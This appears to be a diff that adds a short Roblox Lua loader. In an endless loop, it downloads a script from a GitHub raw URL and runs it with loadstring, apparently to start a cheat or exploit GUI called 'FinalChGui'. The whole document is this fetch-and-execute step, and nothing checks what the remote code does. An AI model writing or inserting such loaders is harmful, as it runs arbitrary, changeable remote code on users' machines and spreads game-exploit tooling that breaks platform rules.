@@ -1,0 +1,3 @@
+while true do
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Anon2915/FinalChGui/main/Script',true))()
+end
